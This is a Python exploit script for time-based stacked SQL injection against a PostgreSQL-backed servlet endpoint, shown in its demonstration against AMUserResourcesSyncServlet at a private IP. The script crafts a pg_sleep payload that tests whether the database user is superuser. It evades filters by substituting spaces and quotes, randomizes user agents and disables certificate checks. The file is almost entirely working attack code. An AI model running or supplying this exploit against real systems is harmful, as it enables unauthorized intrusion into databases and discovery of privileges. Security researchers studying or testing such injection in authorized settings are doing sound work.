#!/usr/bin/python3

# DEMONSTRATION
# $ python3 sqli_pgsql_timed_stacked_specific-query.py ForMasRange,userId get "1;" ";-- " https://192.168.252.12:8443/servlet/AMUserResourcesSyncServlet 5
# [?] Select a parameter to test for injection:: userId
#    ForMasRange
#  > userId
# 
# [*] Using injection string: 1;select case when (select current_setting('is_superuser'))='on' then pg_sleep(5) end;-- 
# [*] Character evasion string: 1;select+case+when+(select+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(5)+end;-- 
#
# [+] Query "select case when (select current_setting('is_superuser'))='on' then pg_sleep(5) end" returned true for sleep time 5

import requests
import urllib3
import os
import sys
import re
import inquirer
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Timeout
timeout = 10

# Default value for empty parameters
def_str = "1"
def_int = 1234

# ASCII start and end
ascii_begin = 32
ascii_end = 126

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# HTTP headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

# Perform the SQLi call for injection

def sqli(url,headers,get_post,inj_param,params,prefix,inj_str,suffix,sleep):
    print("[*] Using injection string: " + prefix + inj_str + suffix)
    # Optionally modify injection string via regex for character evasion
    inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$
    print("[*] Character evasion string: " + prefix + inj_regex_str + suffix)
    # Injection parameters
    inj_params = dict()
    for param in params:
        inj_params[param] = def_str
        if param == inj_param:
            inj_params[param] = prefix + inj_regex_str + suffix
    # Disable URL encoding characters
    inj_params_unencoded = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())
    # Do requests
    if get_post.lower() == "get":
        r = requests.get(url,params=inj_params_unencoded,headers=headers,timeout=timeout,verify=False)
    elif get_post.lower() == "post":
        r = requests.post(url,data=inj_params,headers=headers,timeout=timeout,verify=False)
    # Check response timing
    res = r.elapsed.total_seconds()
    if res >= int(sleep):
        return True
    elif res < int(sleep):
        return False

# Main
def main(argv):
    if len(sys.argv) == 7:
        params = sys.argv[1].split(",")
        get_post = sys.argv[2]
        prefix = sys.argv[3]
        suffix = sys.argv[4]
        url = sys.argv[5]
        sleep = sys.argv[6]
    else:
        print("[*] Usage: " + sys.argv[0] + " <param1,param2,..> <get_or_post> <prefix> <suffix> <url> <time>")
        print("[*] Example: " + sys.argv[0] + " ForMasRange,userId get \"1;\" \";-- \" https://192.168.252.12:8443/servlet/AMUserResourcesSyncServlet 5\n")
        exit(0)
    
    # HTTP headers
    headers = http_headers()

    # Query variables
    inj_prefix = "select case when ("
    inj_query = "select current_setting('is_superuser')"
    inj_suffix = ")='on' then pg_sleep(" + str(sleep) + ") end"

    # Craft entire injection query
    inj_str = inj_prefix + inj_query + inj_suffix

    # Do stuff
    try:
        # Select parameter
        param_question = [inquirer.List('params',
                message="Select a parameter to test for injection:",
                choices=params),]
        param_answer = inquirer.prompt(param_question)
        inj_param = param_answer["params"]

        # Perform the request
        sleep_resp = sqli(url,headers,get_post,inj_param,params,prefix,inj_str,suffix,sleep)
        if sleep_resp:
            print("\n[+] Query \"" + inj_str + "\" returned true for sleep time " + str(sleep) + "\n")
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
